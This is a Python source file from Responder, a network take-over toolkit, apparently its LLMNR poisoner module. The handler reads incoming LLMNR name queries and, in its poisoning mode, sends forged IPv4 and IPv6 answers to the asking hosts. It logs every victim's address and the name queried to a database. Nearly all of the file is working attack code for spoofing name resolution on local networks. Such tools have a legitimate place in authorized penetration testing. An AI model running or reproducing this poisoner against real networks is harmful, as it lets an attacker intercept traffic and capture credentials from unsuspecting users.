#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from packets import LLMNR_Ans, LLMNR6_Ans
from utils import *

if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

def Parse_LLMNR_Name(data):
	import codecs
	NameLen = data[12]
	if (sys.version_info > (3, 0)):
		return data[13:13+NameLen]
	else:
		NameLen2 = int(codecs.encode(NameLen, 'hex'), 16)
		return data[13:13+int(NameLen2)]

def IsICMPRedirectPlausible(IP):
	dnsip = []
	with open('/etc/resolv.conf', 'r') as file:
		for line in file:
			ip = line.split()
			if len(ip) < 2:
				continue
			elif ip[0] == 'nameserver':
				dnsip.extend(ip[1:])
		for x in dnsip:
			if x != "127.0.0.1" and IsIPv6IP(x) is False and IsOnTheSameSubnet(x,IP) is False:	#Temp fix to ignore IPv6 DNS addresses
				print(color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5))
				print(color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5))
				print(color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5))

if settings.Config.AnalyzeMode:
	IsICMPRedirectPlausible(settings.Config.Bind_To)


class LLMNR(BaseRequestHandler):  # LLMNR Server class
	def handle(self):
		try:
			data, soc = self.request
			Name = Parse_LLMNR_Name(data).decode("latin-1")
			LLMNRType = Parse_IPV6_Addr(data)

			# Break out if we don't want to respond to this host
			if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
				return None
			#IPv4
			if data[2:4] == b'\x00\x00' and LLMNRType:
				if settings.Config.AnalyzeMode:
					if not settings.Config.Quiet_Mode:
						LineHeader = "[Analyze mode: LLMNR]"
						print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
						SavePoisonersToDb({
								'Poisoner': 'LLMNR', 
								'SentToIp': self.client_address[0], 
								'ForName': Name,
								'AnalyzeMode': '1',
								})

				elif LLMNRType == True:  # Poisoning Mode
					Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
					Buffer1.calculate()
					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
					if not settings.Config.Quiet_Mode:
						LineHeader = "[*] [LLMNR]"
						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
					SavePoisonersToDb({
							'Poisoner': 'LLMNR', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '0',
							})

				elif LLMNRType == 'IPv6':
					Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
					Buffer1.calculate()
					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
					if not settings.Config.Quiet_Mode:
						LineHeader = "[*] [LLMNR]"
						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
					SavePoisonersToDb({
							'Poisoner': 'LLMNR6', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '0',
							})

		except:
			pass
